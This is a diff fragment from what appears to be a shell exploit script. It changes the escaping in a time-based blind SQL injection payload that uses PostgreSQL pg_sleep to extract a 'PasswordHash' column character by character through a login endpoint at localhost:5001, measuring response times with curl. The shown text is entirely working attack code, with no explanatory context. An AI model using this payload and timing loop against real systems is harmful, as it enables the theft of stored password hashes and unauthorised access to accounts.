@@ -154,7 +154,7 @@ for i in $(seq 1 60); do
   j=1
   while [ $j -le ${#CHARS} ]; do
     c=$(printf '%s' "$CHARS" | cut -c$j)
-    PAYLOAD="admin' AND 1=(SELECT 1 FROM pg_sleep(CASE WHEN SUBSTRING(\"PasswordHash\",$i,1)='${c}' THEN 2 ELSE 0 END))--"
+    PAYLOAD="admin' AND 1=(SELECT 1 FROM pg_sleep(CASE WHEN SUBSTRING(\\\"PasswordHash\\\",$i,1)='${c}' THEN 2 ELSE 0 END))--"
     START=$(date +%s%3N)
     curl -s -X POST http://localhost:5001/bff/auth/login \
       -H "Content-Type: application/json" \
